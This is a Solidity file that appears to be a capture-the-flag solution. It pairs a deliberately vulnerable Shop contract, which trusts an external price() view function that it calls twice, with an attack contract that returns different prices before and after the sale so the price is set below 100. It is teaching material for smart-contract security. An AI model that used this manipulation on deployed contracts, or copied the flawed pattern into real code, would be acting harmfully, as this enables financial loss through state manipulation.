// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//Challeng - To Set the price less than 100 and set the isSold bool to true;
interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

/////////////////////////////////////////////////////////////
///////////////////ATTACK////////////////////////////////////
/////////////////////////////////////////////////////////////
/**
 * We are returning 100 if the isSold variable is falsel, to pass the require check. after isSold is true
 * we are returning 99 so that the price can be defined as 99. which is less than hundred. 
 *  *  
 */

contract Buy is Buyer {
    Shop shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() external view returns (uint256) {
       if(!shop.isSold()){
           return 100;
       } else {
           return 99;
       }
    }

    function attack() external {
        shop.buy();
    }
}
